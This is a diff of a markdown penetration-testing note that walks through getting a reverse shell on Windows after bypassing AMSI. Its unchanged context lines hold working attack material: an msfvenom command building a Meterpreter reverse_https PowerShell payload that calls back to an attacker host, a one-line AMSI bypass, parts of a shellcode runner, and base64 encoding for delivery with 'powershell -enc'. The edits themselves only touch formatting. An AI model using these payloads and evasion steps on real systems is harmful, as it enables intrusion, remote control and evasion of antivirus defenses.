@@ -1,12 +1,12 @@
 Once AMSI has been bypassed, the following can be used to receive a shell
 
-- Create PS1 msfvenom payload:
+Create PS1 msfvenom payload:
 
 ```bash
 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x LPORT=8081 -f ps1
 ```
 
-- Update run.txt
+Update run.txt:
 
 ```bash
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like"*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name-like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf =@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
@@ -57,7 +57,7 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
 
-Create payload
+Create payload:
 
 ```bash
 pwsh  
@@ -67,7 +67,7 @@ $EncodedText = [Convert]::ToBase64String($bytes)
 $EncodedText
 ```
 
-To include the AMSI bypass (this may need to be executed a couple of times)
+To include the AMSI bypass (this may need to be executed a couple of times):
 
 ```bash
 pwsh  
@@ -78,7 +78,7 @@ $EncodedText
 
 ```
 
-- Send this to the target
+Send this to the target:
 
 ```bash
 powershell -enc <string>
